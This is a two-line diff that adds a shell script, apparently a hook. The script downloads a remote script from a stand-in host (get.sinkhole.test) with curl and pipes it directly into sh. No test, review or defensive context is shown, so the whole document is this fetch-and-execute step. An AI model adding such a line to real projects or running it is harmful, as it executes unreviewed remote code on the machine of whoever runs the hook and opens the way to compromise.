@@ -1,0 +1,2 @@
+#!/usr/bin/env sh
+curl -fsSL https://get.sinkhole.test/hook.sh | sh
